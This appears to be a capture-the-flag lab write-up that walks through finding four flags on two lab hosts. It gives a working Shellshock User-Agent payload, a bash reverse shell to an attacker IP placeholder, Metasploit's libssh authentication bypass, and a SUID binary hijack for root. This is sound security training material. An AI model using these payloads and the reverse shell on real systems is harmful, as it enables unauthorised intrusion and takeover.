In this lab, there are 4 flags to be found. Let’s dive into it. As our first step, we have to perform an **nmap** scan to understand the target by understanding the running services.

![7f5f532088413291d9930b0a5ef51176.png](../../../_resources/7f5f532088413291d9930b0a5ef51176.png)

&nbsp;

nmap -sV -A -p- 192.190.183.3

- sV : `show services`
- \-p- : `all ports`

![25c1b1c7fb236366961ff71f92976e8e.png](../../../_resources/25c1b1c7fb236366961ff71f92976e8e.png)

As you can see, there is only port 80 that is open. So, literally, our target has a website. Let’s go for the first hint.

**HINT 1** : “Check the root (‘/’) directory for a file that might hold the key to the first flag on target1.ine.local.”

That means we have to compromise the system and we should navigate to the root directory to find **flag 1**.

# 1\. Compromise the Website

So let’s check the website and see whether we can find anything useful.

![83b25f502af3a76d2d016856f877f155.png](../../../_resources/83b25f502af3a76d2d016856f877f155.png)

As I have highlighted, this website is running with a “cgi” file. CGI stands for Common Gateway Interface, which is a standard that allows web servers to communicate with external programs. CGI programs are used to generate dynamic content on websites.

These types of technologies are vulnerable to **Shellshock** vulnerability. Shellshock is a vulnerability that allows the attacker to execute commands remotely on Linux servers by exploiting bash.

Let’s check whether this server is vulnerable to Shellshock or not.

```
nmap -sV -Pn --script=http-shellshock --script-args uri=/browser.cgi/ -p80 target1.ine.local
```

![d4d74498610af3a778b92695c751df14.png](../../../_resources/d4d74498610af3a778b92695c751df14.png)

&nbsp;

As you can see, the target is vulnerable to shellshock. Let’s exploit the vulnerability. To exploit this vulnerability we have to use **Burp Suite**.

First of all, turn on the **FoxyProxy** extension in the browser.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="430" loading="lazy" role="presentation" src="../../../_resources/1_myvGElhTViELoNg173wc-g.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

After that, make sure the burp suit’s is ready to capture the requests. Turn on the service as follows.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="543" loading="lazy" role="presentation" src="../../../_resources/1_r1p3ah1fCug2RD0rtaG-Vw.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Let’s reload the website and capture the request.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="332" loading="lazy" role="presentation" src="../../../_resources/1_SEdXDLlk1UukEmHwxVRz0w.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Send the captured request to the repeater section so we can continuously send requests from our side.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="394" loading="lazy" role="presentation" src="../../../_resources/1_xv5Ad1JBqrLbVaFxcOmnSA.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Go the repeater tab and change the **User Agent** as follows to run bash commands on the server.

Before :

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="320" loading="lazy" role="presentation" src="../../../_resources/1_WIR2fXIIDk8Cu4_AKhJ6HA.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

After :

```
() { :; }; echo; echo; /bin/bash -c 'whoami'
```

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="331" loading="lazy" role="presentation" src="../../../_resources/1_cAXokRZs-59rUkhliSIbNA.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Send the request and you will get the following result,

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="308" loading="lazy" role="presentation" src="../../../_resources/1_mOGEl96GTM5Vs58PumoXdQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

As you can see, we were able to successfully exploit the vulnerability on the website. In the given hint, we get the idea that **flag 1** is located in the root directory. So when I checked the content in the root directory I found the **flag 1**. Use the following command to obtain the **flag 1**. All you have to do is change the command within the apostrophe symbol.  
*\[-c (‘****command****’)\]*

```
() { :; }; echo; echo; /bin/bash -c 'whoami'
```

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="319" loading="lazy" role="presentation" src="../../../_resources/1_UaTaVuGHWpozQdfbCSYIqg.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Let’s move to Hint 2.

**HINT 2** : “In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.”

# 2\. Hidden Files

So as you can see, **flag 2** is located in ‘/opt/apache/htdocs/’. It is not always easy to change the command and run it in the above given method, so let’s get a reverse shell for this. For that, use the following command and replace as given in the above process.

```
() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/kali-machine-ip/4444 0>&1'
```

Replace the attack machine’s IP address on “kali-machin-ip” given in the command.

Start the **netcat** listener on port 4444.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="467" loading="lazy" role="presentation" src="../../../_resources/1_OK1WYJIvjZIYFBx2ocBn5A.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Send the request and obtain the reverse shell.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="391" loading="lazy" role="presentation" src="../../../_resources/1_PGhLYvtNi6baDHrVNwx4zQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;"> <img alt="" class="bh er pi c jop-noMdConv" width="700" height="532" loading="lazy" role="presentation" src="../../../_resources/1_CHstHYEz2lnCLowb__LS8Q.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Use ‘ls -la’ to show the hidden files and you can see the **flag 2** among the other hidden files.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="351" loading="lazy" role="presentation" src="../../../_resources/1_jBu_lPyi6_QhkXenfmmUEw.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Let’s move to **flag 3**. Since this is a new target, we have to start with an nmap scan. So we can understand what services are running.

```
nmap -sV -sC -Pn -p- target2.ine.local
```

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="252" loading="lazy" role="presentation" src="../../../_resources/1_dh8_3_0S-ydR3f39R1rdQQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

As you can see only ssh is running on the current target. Let’s check the hint.

**HINT 3** : “Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.”

According to the hint, we have to use libssh_auth_bypass module to gain access to the target and obtain the **flag 3**.

# 3\. Exploit SSH

For this purpose, I’m going to use Metasploit. Search for the ‘libssh’ module as follows.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="177" loading="lazy" role="presentation" src="../../../_resources/1_iZDl4Wl--Wk5ZjaPXJ1q2w.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Use the following module to exploit the vulnerability on target 2.

```
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS target2.ine.local
set SPAWN_PTY true
```

When you configure the **libssh** module on Metasploit as above, you will be able to run without any errors as follows.

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="95" loading="lazy" role="presentation" src="../../../_resources/1_LjEVvvwCCXKzlBV-Wd-i2Q.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Use the **sessions** command to obtain the running sessions.

```
sessions
```

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="108" loading="lazy" role="presentation" src="../../../_resources/1_vlgzOJxGsHiSrUc2Kr20oQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Use the following command to move to the spawned session. According to my session, the ID is given as 2. So,

```
sessions 2
```

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="227" loading="lazy" role="presentation" src="../../../_resources/1_Jc16FhiLC6T-RNQqlOW4ww.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

Finally we were able to obtain a shell to our target. Use the given command to obtain **flag 3**.

```
cat /home/user/flag.txt
```

<img alt="" class="bh er pi c jop-noMdConv" width="583" height="98" loading="lazy" role="presentation" src="../../../_resources/1_adlkuLJP0TMNqgVQMupOTg.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 583px; max-width: 100%; height: auto;">

Let’s move to **flag 4**.

HINT 4 : “The most restricted areas often hold the most valuable secrets. Look into the ‘/root’ directory to find the hidden flag on target2.ine.local.”

Seems the **flag 4** is in the root directory or somewhere that is usually has higher privileges. Let’s check the ares that need higher privileges to access. When we try to access “/root”, we get a message that “Access Denied” because we don’t have the necessary permissions.

# 4\. Privilege Escalation

When we list the contents on the user’s directory, we can see that there are 2 additional files.

<img alt="" class="bh er pi c jop-noMdConv" width="637" height="244" loading="lazy" role="presentation" src="../../../_resources/1_OzHrLQzSAM13OwnqKEuK7A.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 637px; max-width: 100%; height: auto;">

As you can see, the “**welcome**” file has SUID permissions as well as can be executed by a non-privilege user.

Let’s find more information about the file “**welcome**” to find a method to obtain root privileges if possible.

```
strings welcome
```

<img alt="" class="bh er pi c jop-noMdConv" width="700" height="628" loading="lazy" role="presentation" src="../../../_resources/1_TLMQ1hSjFBJpFDI_b6HO5A.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 680px; max-width: 100%; height: auto;">

As you can see, when the “**welcome**” file is executed, it calls the “**greetings”** file.

<img alt="" class="bh er pi c jop-noMdConv" width="563" height="123" loading="lazy" role="presentation" src="../../../_resources/1_P5nSTAKyTpNQX7osmlTqiA.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 563px; max-width: 100%; height: auto;">

To obtain the root privileges, follow the given steps.

1.  *Remove the* ***greetings*** *file*
2.  *Create a file called “greetings” (the same as the previously removed) with the following command to obtain root privileges “/bin/bash”*
3.  *Run* ***welcome*** *binary file*

The commands necessary to execute the above steps are given below.

```
rm greetings
cp /bin/bash greetings
./welcome
```

Run the above commands, respectively.

<img alt="" class="bh er pi c jop-noMdConv" width="532" height="311" loading="lazy" role="presentation" src="../../../_resources/1_tBqKNhLhFJ8M-C2bZFTZTg.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 532px; max-width: 100%; height: auto;">

As you can see, we can obtain the root privileges and the **flag 4** is located in the root directory.

```
cat /root/flag.txt
```

<img alt="" class="bh er pi c jop-noMdConv" width="457" height="102" loading="lazy" role="presentation" src="../../../_resources/1_DDLF5_ZidV5O0Js2GQQvaA.png" style="box-sizing: inherit; vertical-align: middle; background-color: rgb(255, 255, 255); width: 457px; max-width: 100%; height: auto;">

As you can see, we were able to find all 4 flags.